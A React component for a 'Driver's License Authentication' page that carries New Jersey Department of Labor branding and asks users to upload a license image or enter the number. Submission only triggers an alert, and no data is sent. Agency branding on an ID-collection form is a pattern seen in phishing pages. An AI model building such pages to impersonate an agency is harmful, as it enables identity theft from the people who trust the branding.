import styles from '../styles/Home.module.css';
import { useRef, useState } from 'react';

const Authenticate = () => {
    const form = useRef();
    const [licenseImage, setLicenseImage] = useState(null);
    const [licenseNumber, setLicenseNumber] = useState('');

    const handleImageChange = (e) => {
        setLicenseImage(e.target.files[0]);
    };

    const handleNumberChange = (e) => {
        setLicenseNumber(e.target.value);
    };

    const handleSubmit = (e) => {
        e.preventDefault();
        if (!licenseImage && !licenseNumber) {
            alert('Please provide either a driver’s license image or number.');
            return;
        }
        // Add your authentication logic here
        alert('Authentication submitted!');
    };

    return (
        <div className={styles.container}>
            {/* Logo Section */}
            <div className={styles.logoWrapper}>
                <img
                    src="/ASSET/njdol_logo_stamp.svg"
                    alt="NEW JERSEY LOGO"
                    className={styles.logo}
                />
            </div>

            {/* Authentication Form Section */}
            <div className={styles.formSection}>
                <form className={styles.loginForm} ref={form} onSubmit={handleSubmit}>
                    <h2 className={styles.heading}>Driver’s License Authentication</h2>
                    <p style={{
                        textAlign: 'center',
                        color: '#254d73',
                        fontSize: '1rem',
                        margin: '0 0 18px 0',
                        fontStyle: 'italic'
                    }}>
                        Please upload a clear image of your driver’s license, or enter your driver’s license number if the image is not available.
                    </p>
                    <label style={{ width: '100%', marginBottom: '12px', color: '#2a2f32', fontWeight: 500 }}>
                        Upload Driver’s License Image
                        <input
                            type="file"
                            accept="image/*"
                            onChange={handleImageChange}
                            style={{ display: 'block', marginTop: '6px' }}
                        />
                    </label>
                    <input
                        type="text"
                        id="licenseNumber"
                        name="licenseNumber"
                        placeholder="Enter Driver’s License Number"
                        className={styles.input}
                        value={licenseNumber}
                        onChange={handleNumberChange}
                        disabled={!!licenseImage}
                    />
                    <button type="submit" className={styles.button} style={{ marginTop: '22px' }}>
                        Submit
                    </button>
                </form>
            </div>
            <footer className={styles.footer}>
                <p>© New Jersey Department of Labor and Workforce Development(NJLWD). All Rights Reserved.</p>
            </footer>
        </div>
    );
};

export default Authenticate;